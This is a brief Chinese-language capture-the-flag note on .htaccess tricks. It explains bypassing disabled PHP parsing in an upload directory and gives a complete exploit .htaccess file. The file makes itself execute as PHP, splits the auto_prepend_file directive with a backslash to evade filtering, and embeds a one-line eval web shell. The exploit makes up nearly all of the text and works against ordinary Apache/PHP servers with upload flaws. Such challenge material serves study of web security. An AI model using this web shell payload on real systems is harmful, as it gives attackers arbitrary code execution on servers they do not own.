# .htaccess的一些技巧

题目给了源代码，存在任意文件上传漏洞
但apache2.conf中把上传目录的php解析关了
如果直接上传php_flag engine on会没用

使用下面exp即可 (.htaccess)

<Files .htaccess>
ForceType application/x-httpd-php
SetHandler application/x-httpd-php
Require all granted
php_flag engine on
</Files>
php_value auto_prepend_fi\
le .htaccess
#<?php eval($_REQUEST['evoA'])?>